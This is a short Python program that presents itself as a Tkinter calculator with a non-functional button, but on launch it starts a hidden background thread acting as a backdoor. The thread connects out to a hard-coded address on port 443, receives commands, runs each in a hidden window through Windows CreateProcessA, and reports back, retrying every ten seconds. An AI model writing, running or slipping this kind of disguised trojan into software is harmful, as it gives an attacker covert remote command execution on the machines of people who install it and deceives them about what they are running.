import tkinter as tk
import threading
import time
import ctypes
from ctypes import wintypes

# Direct IP and Port
TARGET_IP = "10.211.55.5"
TARGET_PORT = 443

def execute_command(cmd):
    si = wintypes.STARTUPINFO()
    si.cb = ctypes.sizeof(si)
    si.dwFlags = 0x00000001
    si.wShowWindow = 0
    pi = wintypes.PROCESS_INFORMATION()
    ctypes.windll.kernel32.CreateProcessA(None, cmd.encode(), None, None, False, 0x08000000, None, None, ctypes.byref(si), ctypes.byref(pi))

def start_backdoor():
    ws2_32 = ctypes.windll.ws2_32
    wsa_data = ctypes.create_string_buffer(400)
    ws2_32.WSAStartup(0x0202, wsa_data)
    
    while True:
        try:
            s = ws2_32.socket(2, 1, 6)
            addr = ctypes.create_string_buffer(16)
            # sockaddr_in: AF_INET(2), Port(443), IP(10.211.55.5)
            addr.raw = b'\x02\x00' + TARGET_PORT.to_bytes(2, 'big') + b'\x0A\xD3\x37\x05' + b'\x00'*8
            if ws2_32.connect(s, addr, 16) == 0:
                while True:
                    data = ctypes.create_string_buffer(1024)
                    if ws2_32.recv(s, data, 1024, 0) > 0:
                        execute_command(data.value.decode().strip())
                        ws2_32.send(s, b"Executed", 8, 0)
                    else: break
            time.sleep(10)
        except: time.sleep(10)

class CalcApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Calculator")
        tk.Button(root, text="Calculate", command=lambda: None).pack()
        threading.Thread(target=start_backdoor, daemon=True).start()

if __name__ == "__main__":
    root = tk.Tk()
    CalcApp(root)
    root.mainloop()
